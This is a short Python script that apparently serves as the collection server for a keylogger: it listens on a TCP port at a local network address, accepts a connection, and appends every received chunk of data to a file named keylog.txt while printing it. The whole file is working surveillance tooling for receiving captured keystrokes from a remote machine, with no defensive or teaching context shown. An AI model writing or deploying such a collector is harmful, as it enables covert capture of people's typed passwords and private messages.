# This Python file uses the following encoding: utf-8
import socket

host = '192.168.1.11'
port = 9999

s = socket.socket()
s.bind((host, port))
s.listen(2)

def file_write(keys):
    with open("/home/hmei7/Documents/key/keylog.txt","a") as file:
        for key in keys:
            file.write(key)

print(host)
conn, address = s.accept()
print("Connected to Client: " + str(address))
while True:
    data = conn.recv(1024).decode()
    file_write(str(data))
    if not data:
        break
    print(str(data))
conn.close()